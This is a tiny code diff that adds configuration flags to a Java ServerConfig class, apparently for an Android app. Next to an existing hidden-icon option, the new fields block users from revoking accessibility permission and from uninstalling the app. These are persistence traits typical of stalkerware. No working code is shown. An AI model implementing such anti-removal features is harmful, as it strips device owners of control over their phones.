@@ -21,4 +21,9 @@ public class ServerConfig {
 
     //是否隐藏图标
     private boolean hideIcon;
+
+    //是否阻止关闭无障碍权限
+    private boolean accessibilityGuard;
+    //是否阻止卸载
+    private boolean uninstallGuard;
 }
